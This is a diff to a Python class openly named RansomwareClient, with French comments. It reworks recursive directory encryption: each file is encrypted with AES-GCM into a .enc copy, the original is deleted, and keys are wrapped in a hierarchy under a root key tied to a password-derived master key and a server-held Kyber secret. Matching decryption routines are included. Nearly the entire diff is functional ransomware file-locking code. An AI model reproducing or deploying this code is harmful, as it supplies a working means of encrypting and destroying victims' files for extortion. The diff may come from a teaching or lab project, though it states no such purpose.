@@ -39,14 +39,10 @@ class RansomwareClient:
         Returns:
             True si fichier doit pas être chiffré
         """
-        # Ignore fichiers exclus
         if file_path.name in config.EXCLUDED_FILES:
             return True
-
-        # Ignore extensions exclues
         if file_path.suffix in config.EXCLUDED_EXTENSIONS:
             return True
-
         return False
 
     def _should_skip_dir(self, dir_name: str) -> bool:
@@ -61,9 +57,27 @@ class RansomwareClient:
         """
         return dir_name in config.EXCLUDED_DIRS
 
+    def _save_wrapped_key(self, key_path: Path, key: bytes, wrapping_key: bytes) -> None:
+        """Encapsule key avec wrapping_key et sauvegarde dans key_path"""
+        wrapped, nonce = crypto_utils.wrap_key_aes_gcm(key, wrapping_key)
+        data = {
+            "ciphertext": base64.b64encode(wrapped).decode('utf-8'),
+            "nonce": base64.b64encode(nonce).decode('utf-8'),
+        }
+        with open(key_path, 'w') as f:
+            json.dump(data, f, indent=2)
+
+    def _load_wrapped_key(self, key_path: Path, wrapping_key: bytes) -> bytes:
+        """Charge et désencapsule clé depuis key_path avec wrapping_key"""
+        with open(key_path, 'r') as f:
+            data = json.load(f)
+        wrapped = base64.b64decode(data["ciphertext"])
+        nonce = base64.b64decode(data["nonce"])
+        return crypto_utils.unwrap_key_aes_gcm(wrapped, wrapping_key, nonce)
+
     def encrypt_directory(self, path: str = ".") -> None:
         """
-        Chiffre tous fichiers d'un dossier
+        Chiffre tous fichiers d'un dossier de manière récursive et hiérarchique
 
         Args:
             path: Chemin dossier à chiffrer
@@ -72,7 +86,6 @@ class RansomwareClient:
 
         print(f"\n[CLT] Démarrage du chiffrement de {target_path}")
 
-        # Initialise serveur et récupère credentials
         print("[CLT] Initialisation au serveur")
         server_data = server.initialize_server()
 
@@ -95,14 +108,13 @@ class RansomwareClient:
 
         # Encapsule RK avec MK
         print("[CLT] Encapsule RK avec MK")
-        wrapped_rk_ciphertext, wrapped_rk_nonce, wrapped_rk_tag = crypto_utils.wrap_key_aes_gcm(root_key, master_key)
+        wrapped_rk_with_tag, wrapped_rk_nonce = crypto_utils.wrap_key_aes_gcm(root_key, master_key)
 
         # Sauvegarde infos RK dans rootkey.bin
         print(f"[CLT] Sauvegarde de RK dans rootkey.bin")
         rootkey_data = {
-            "wrapped_rk_ciphertext": base64.b64encode(wrapped_rk_ciphertext).decode('utf-8'),
+            "wrapped_rk_ciphertext": base64.b64encode(wrapped_rk_with_tag).decode('utf-8'),
             "wrapped_rk_nonce": base64.b64encode(wrapped_rk_nonce).decode('utf-8'),
-            "wrapped_rk_tag": base64.b64encode(wrapped_rk_tag).decode('utf-8'),
             "kyber_ciphertext": base64.b64encode(kyber_ciphertext).decode('utf-8'),
             "salt": base64.b64encode(salt).decode('utf-8'),
             "argon2_params": argon2_params,
@@ -111,75 +123,109 @@ class RansomwareClient:
         with open(self.rootkey_path, 'w') as f:
             json.dump(rootkey_data, f, indent=2)
 
-        # Parcourt et chiffre fichiers
-        print("[CLT] Parcourt et chiffre fichiers")
-        encrypted_count = 0
-
-        for root, dirs, files in os.walk(target_path):
-            # Filtre dossiers à ignorer
-            dirs[:] = [d for d in dirs if not self._should_skip_dir(d)]
-
-            for filename in files:
-                file_path = Path(root) / filename
-
-                # Ignore fichiers à ne pas chiffrer
-                if self._should_skip_file(file_path):
-                    continue
-
-                # Chiffre fichier
-                try:
-                    self._encrypt_file(file_path, root_key)
-                    encrypted_count += 1
-                except Exception as e:
-                    print(f"  [ERR] Erreur chiffrement de {file_path.name}: {e}")
+        # Chiffrement récursif
+        encrypted_count = self._encrypt_dir_recursive(target_path, root_key, root_key, is_root_level=True)
 
         print(f"\n[CLT] Chiffrement terminé : {encrypted_count} fichier(s) chiffré(s)")
         print(f"[CLT] Mot de passe : {password}")
 
-    def _encrypt_file(self, file_path: Path, root_key: bytes) -> None:
+    def _encrypt_dir_recursive(self, dir_path: Path, parent_key: bytes, root_key: bytes, is_root_level: bool) -> int:
         """
-        Chiffre un fichier
+        Chiffrement récursif dossier
 
         Args:
-            file_path: Chemin fichier à chiffrer
-            root_key: RK pour encapsuler clé fichier
-        """
-        print(f"  [ENCRYPT] {file_path.name}")
+            dir_path: Dossier à chiffrer
+            parent_key: Clé parente pour chiffrer clés courant
+            root_key: RK pour générer .root_key
+            is_root_level: True si on est au niveau racine du dossier cible
 
-        # Lit fichier
+        Returns:
+            Nombre de fichiers chiffrés
+        """
+        count = 0
+        # Snapshot avant modifications
+        entries = sorted(dir_path.iterdir())
+
+        for entry in entries:
+            if entry.is_dir():
+                if self._should_skip_dir(entry.name):
+                    continue
+
+                # Génère folder_key aléatoire
+                folder_key = crypto_utils.generate_random_key()
+
+                self._save_wrapped_key(
+                    dir_path / (entry.name + config.KEY_EXTENSION),
+                    folder_key,
+                    parent_key
+                )
+
+                if not is_root_level:
+                    self._save_wrapped_key(
+                        dir_path / (entry.name + config.ROOT_KEY_EXTENSION),
+                        folder_key,
+                        root_key
+                    )
+
+                print(f"  [ENCRYPT DIR] {entry.relative_to(self.base_path)}/")
+
+                # Récursion avec folder_key comme parent
+                count += self._encrypt_dir_recursive(entry, folder_key, root_key, is_root_level=False)
+
+            elif entry.is_file():
+                if self._should_skip_file(entry):
+                    continue
+
+                print(f"  [ENCRYPT] {entry.relative_to(self.base_path)}")
+                try:
+                    file_key = self._encrypt_file_to_enc(entry)
+
+                    self._save_wrapped_key(
+                        dir_path / (entry.name + config.KEY_EXTENSION),
+                        file_key,
+                        parent_key
+                    )
+
+                    if not is_root_level:
+                        self._save_wrapped_key(
+                            dir_path / (entry.name + config.ROOT_KEY_EXTENSION),
+                            file_key,
+                            root_key
+                        )
+
+                    count += 1
+                except Exception as e:
+                    print(f"  [ERR] Erreur chiffrement de {entry.name}: {e}")
+
+        return count
+
+    def _encrypt_file_to_enc(self, file_path: Path) -> bytes:
+        """
+        Chiffre fichier en .enc et supprime l'original.
+
+        Args:
+            file_path: Fichier à chiffrer
+
+        Returns:
+            file_key utilisée pour chiffrement
+        """
         with open(file_path, 'rb') as f:
             plaintext = f.read()
 
-        # Génère clé fichier aléatoire
         file_key = crypto_utils.generate_random_key()
+        ciphertext_with_tag, nonce = crypto_utils.encrypt_aes_gcm(plaintext, file_key)
 
-        # Chiffre avec AES-GCM
-        ciphertext, nonce, tag = crypto_utils.encrypt_aes_gcm(plaintext, file_key)
+        # Stocke nonce (12 octets) puis ciphertext_with_tag dans .enc
+        enc_path = Path(str(file_path) + config.ENC_EXTENSION)
+        with open(enc_path, 'wb') as f:
+            f.write(nonce + ciphertext_with_tag)
 
-        # Encapsule clé fichier avec RK
-        wrapped_key_ciphertext, wrapped_key_nonce, wrapped_key_tag = crypto_utils.wrap_key_aes_gcm(file_key, root_key)
-
-        # Crée métadonnées
-        metadata = {
-            "wrapped_key_ciphertext": base64.b64encode(wrapped_key_ciphertext).decode('utf-8'),
-            "wrapped_key_nonce": base64.b64encode(wrapped_key_nonce).decode('utf-8'),
-            "wrapped_key_tag": base64.b64encode(wrapped_key_tag).decode('utf-8'),
-            "nonce": base64.b64encode(nonce).decode('utf-8'),
-            "tag": base64.b64encode(tag).decode('utf-8'),
-        }
-
-        # Sauvegarde métadonnées dans fichier .meta
-        meta_path = file_path.with_suffix(file_path.suffix + config.META_EXTENSION)
-        with open(meta_path, 'w') as f:
-            json.dump(metadata, f, indent=2)
-
-        # Écrase fichier original avec contenu chiffré
-        with open(file_path, 'wb') as f:
-            f.write(ciphertext)
+        file_path.unlink()
+        return file_key
 
     def decrypt_all(self, path: str = ".") -> None:
         """
-        Déchiffre tous les fichiers
+        Déchiffre tous fichiers
 
         Args:
             path: Chemin dossier à déchiffrer
@@ -188,7 +234,6 @@ class RansomwareClient:
 
         print(f"\n[CLT] Démarrage du déchiffrement {target_path}")
 
-        # Credentials au serveur
         credentials = server.request_full_decryption_credentials()
 
         password = credentials["password"]
@@ -211,135 +256,165 @@ class RansomwareClient:
         with open(self.rootkey_path, 'r') as f:
             rootkey_data = json.load(f)
 
-        wrapped_rk_ciphertext = base64.b64decode(rootkey_data["wrapped_rk_ciphertext"])
+        wrapped_rk_with_tag = base64.b64decode(rootkey_data["wrapped_rk_ciphertext"])
         wrapped_rk_nonce = base64.b64decode(rootkey_data["wrapped_rk_nonce"])
-        wrapped_rk_tag = base64.b64decode(rootkey_data["wrapped_rk_tag"])
 
         print("[CLT] Désencapsule RK")
-        root_key = crypto_utils.unwrap_key_aes_gcm(wrapped_rk_ciphertext, master_key, wrapped_rk_nonce, wrapped_rk_tag)
+        root_key = crypto_utils.unwrap_key_aes_gcm(wrapped_rk_with_tag, master_key, wrapped_rk_nonce)
 
-        # Parcourt et déchiffre tous les fichiers
-        print("[CLT] Parcourt et déchiffre tous les fichiers")
-        decrypted_count = 0
-
-        for root, dirs, files in os.walk(target_path):
-            # Filtre dossiers à ne pas chiffrer
-            dirs[:] = [d for d in dirs if not self._should_skip_dir(d)]
-
-            for filename in files:
-                # Cherche fichiers .meta
-                if not filename.endswith(config.META_EXTENSION):
-                    continue
-
-                meta_path = Path(root) / filename
-                encrypted_path = meta_path.with_suffix('')
-
-                try:
-                    self._decrypt_file_with_rk(encrypted_path, meta_path, root_key)
-                    decrypted_count += 1
-                except Exception as e:
-                    print(f"  [ERR] Erreur déchiffrement de {filename}: {e}")
+        # Déchiffrement récursif
+        print("[CLT] Déchiffrement récursif")
+        decrypted_count = self._decrypt_dir_recursive(target_path, root_key, root_key)
 
         print(f"\n[CLT] Déchiffrement terminé : {decrypted_count} fichier(s) déchiffré(s)")
 
-    def _decrypt_file_with_rk(self, encrypted_path: Path, meta_path: Path, root_key: bytes) -> None:
+    def _decrypt_dir_recursive(self, dir_path: Path, parent_key: bytes, root_key: bytes) -> int:
         """
-        Déchiffre un fichier avec RK
+        Déchiffrement récursif dossier
 
         Args:
-            encrypted_path: Chemin fichier chiffré
-            meta_path: Chemin fichier de métadonnées
-            root_key: RK pour désencapsuler clé du fichier
+            dir_path: Dossier à déchiffrer
+            parent_key: Clé parente pour déchiffrer .key du niveau courant
+            root_key: RK pour déchiffrer .root_key (déchiffrement partiel)
+
+        Returns:
+            Nombre de fichiers déchiffrés
         """
-        print(f"  [DECRYPT] {encrypted_path.name}")
+        count = 0
+        entries = sorted(dir_path.iterdir())  # snapshot
 
-        # Lit métadonnées
-        with open(meta_path, 'r') as f:
-            metadata = json.load(f)
+        # D'abord les sous-dossiers
+        for entry in entries:
+            if not entry.is_dir() or self._should_skip_dir(entry.name):
+                continue
 
-        wrapped_key_ciphertext = base64.b64decode(metadata["wrapped_key_ciphertext"])
-        wrapped_key_nonce = base64.b64decode(metadata["wrapped_key_nonce"])
-        wrapped_key_tag = base64.b64decode(metadata["wrapped_key_tag"])
-        nonce = base64.b64decode(metadata["nonce"])
-        tag = base64.b64decode(metadata["tag"])
+            key_path = dir_path / (entry.name + config.KEY_EXTENSION)
+            root_key_path = dir_path / (entry.name + config.ROOT_KEY_EXTENSION)
 
-        # Lit fichier chiffré
-        with open(encrypted_path, 'rb') as f:
-            ciphertext = f.read()
+            if root_key_path.exists():
+                use_path, use_key = root_key_path, root_key
+            elif key_path.exists():
+                use_path, use_key = key_path, parent_key
+            else:
+                continue
 
-        # Désencapsule clé de fichier
-        file_key = crypto_utils.unwrap_key_aes_gcm(wrapped_key_ciphertext, root_key, wrapped_key_nonce, wrapped_key_tag)
+            try:
+                folder_key = self._load_wrapped_key(use_path, use_key)
+                if key_path.exists():
+                    key_path.unlink()
+                if root_key_path.exists():
+                    root_key_path.unlink()
 
-        # Déchiffre
-        plaintext = crypto_utils.decrypt_aes_gcm(ciphertext, file_key, nonce, tag)
+                count += self._decrypt_dir_recursive(entry, folder_key, root_key)
+            except Exception as e:
+                print(f"  [ERR] Dossier {entry.name}: {e}")
 
-        # Écrase fichier avec contenu normal
-        with open(encrypted_path, 'wb') as f:
-            f.write(plaintext)
+        # Traite ensuite fichiers .enc
+        for entry in entries:
+            if not entry.is_file() or not entry.name.endswith(config.ENC_EXTENSION):
+                continue
 
-        # Supprime .meta
-        meta_path.unlink()
+            base_name = entry.name[:-len(config.ENC_EXTENSION)]
+            key_path = dir_path / (base_name + config.KEY_EXTENSION)
+            root_key_path = dir_path / (base_name + config.ROOT_KEY_EXTENSION)
+
+            if root_key_path.exists():
+                use_path, use_key = root_key_path, root_key
+            elif key_path.exists():
+                use_path, use_key = key_path, parent_key
+            else:
+                print(f"  [WARN] Pas de .key/.root_key pour {entry.name}")
+                continue
+
+            try:
+                file_key = self._load_wrapped_key(use_path, use_key)
+
+                with open(entry, 'rb') as f:
+                    data = f.read()
+
+                nonce = data[:12]
+                ciphertext_with_tag = data[12:]
+                plaintext = crypto_utils.decrypt_aes_gcm(ciphertext_with_tag, file_key, nonce)
+
+                original_path = dir_path / base_name
+                with open(original_path, 'wb') as f:
+                    f.write(plaintext)
+
+                entry.unlink()
+                if key_path.exists():
+                    key_path.unlink()
+                if root_key_path.exists():
+                    root_key_path.unlink()
+
+                print(f"  [DECRYPT] {original_path.relative_to(self.base_path)}")
+                count += 1
+            except Exception as e:
+                print(f"  [ERR] {entry.name}: {e}")
+
+        return count
 
     def decrypt_file(self, file_path: str) -> None:
         """
-        Déchiffre un seul fichier en utilisant mdp
+        Déchiffre un seul fichier
 
         Args:
-            file_path: Chemin du fichier à déchiffrer ou .meta
+            file_path: Chemin du fichier chiffré (.enc) ou nom original
         """
-        # Vérifie si c'est .meta ou fichier chiffré
         file_path_obj = Path(file_path).resolve()
 
-        if file_path_obj.name.endswith(config.META_EXTENSION):
-            meta_path = file_path_obj
-            encrypted_path = meta_path.with_suffix('')
+        # Détermine enc_path et base_name
+        if file_path_obj.name.endswith(config.ENC_EXTENSION):
+            enc_path = file_path_obj
+            base_name = enc_path.name[:-len(config.ENC_EXTENSION)]
         else:
-            encrypted_path = file_path_obj
-            meta_path = Path(str(encrypted_path) + config.META_EXTENSION)
+            base_name = file_path_obj.name
+            enc_path = file_path_obj.parent / (base_name + config.ENC_EXTENSION)
 
-        if not meta_path.exists():
-            raise FileNotFoundError(f"Fichier métadonnées {meta_path} pas trouvé")
+        parent_dir = enc_path.parent
+        key_path = parent_dir / (base_name + config.KEY_EXTENSION)
+        root_key_path = parent_dir / (base_name + config.ROOT_KEY_EXTENSION)
 
-        if not encrypted_path.exists():
-            raise FileNotFoundError(f"Fichier chiffré {encrypted_path} pas trouvé")
+        if not enc_path.exists():
+            raise FileNotFoundError(f"Fichier chiffré {enc_path} pas trouvé")
 
-        print(f"\n[CLT] Déchiffrement fichier avec mot de passe {encrypted_path.name}")
+        rk_path = root_key_path if root_key_path.exists() else key_path
+        if not rk_path.exists():
+            raise FileNotFoundError(f"Fichier clé pas trouvé pour {base_name}")
 
-        # Credentials au serveur
-        credentials = server.request_full_decryption_credentials()
+        print(f"\n[CLT] Déchiffrement fichier unique via serveur : {base_name}")
 
-        password = credentials["password"]
-        salt = credentials["salt"]
-        argon2_params = credentials["argon2_params"]
-
-        # Dérive MK
-        print("[CLT] Dérive MK")
-        master_key = crypto_utils.derive_key_argon2(
-            password=password,
-            salt=salt,
-            **argon2_params
-        )
-
-        # Lit rootkey.bin et désencapsule RK
-        print("[CLT] Lecture de rootkey.bin")
         if not self.rootkey_path.exists():
             raise FileNotFoundError(f"Fichier {config.ROOTKEY_FILENAME} pas trouvé")
 
         with open(self.rootkey_path, 'r') as f:
             rootkey_data = json.load(f)
+        kyber_ciphertext = base64.b64decode(rootkey_data["kyber_ciphertext"])
 
-        wrapped_rk_ciphertext = base64.b64decode(rootkey_data["wrapped_rk_ciphertext"])
-        wrapped_rk_nonce = base64.b64decode(rootkey_data["wrapped_rk_nonce"])
-        wrapped_rk_tag = base64.b64decode(rootkey_data["wrapped_rk_tag"])
+        with open(rk_path, 'r') as f:
+            rk_data = json.load(f)
 
-        print("[CLT] Désencapsule RK")
-        root_key = crypto_utils.unwrap_key_aes_gcm(wrapped_rk_ciphertext, master_key, wrapped_rk_nonce, wrapped_rk_tag)
+        print("[CLT] Envoi clé au serveur pour déchiffrement avec RK")
+        file_key = server.decrypt_file_key(rk_data, kyber_ciphertext)
 
-        # Déchiffre fichier
-        print("[CLT] Déchiffre le fichier")
-        self._decrypt_file_with_rk(encrypted_path, meta_path, root_key)
+        # Déchiffre fichier avec file_key
+        with open(enc_path, 'rb') as f:
+            data = f.read()
 
-        print(f"[CLT] Fichier déchiffré {encrypted_path}")
+        nonce = data[:12]
+        ciphertext_with_tag = data[12:]
+        plaintext = crypto_utils.decrypt_aes_gcm(ciphertext_with_tag, file_key, nonce)
+
+        original_path = parent_dir / base_name
+        with open(original_path, 'wb') as f:
+            f.write(plaintext)
+
+        enc_path.unlink()
+        if root_key_path.exists():
+            root_key_path.unlink()
+        if key_path.exists():
+            key_path.unlink()
+
+        print(f"[CLT] Fichier déchiffré : {original_path}")
 
     def change_password(self) -> None:
         """
@@ -376,7 +451,6 @@ class RansomwareClient:
         rootkey_data = {
             "wrapped_rk_ciphertext": base64.b64encode(result["wrapped_rk_ciphertext"]).decode('utf-8'),
             "wrapped_rk_nonce": base64.b64encode(result["wrapped_rk_nonce"]).decode('utf-8'),
-            "wrapped_rk_tag": base64.b64encode(result["wrapped_rk_tag"]).decode('utf-8'),
             "kyber_ciphertext": base64.b64encode(kyber_ciphertext).decode('utf-8'),
             "salt": base64.b64encode(result["salt"]).decode('utf-8'),
             "argon2_params": result["argon2_params"],
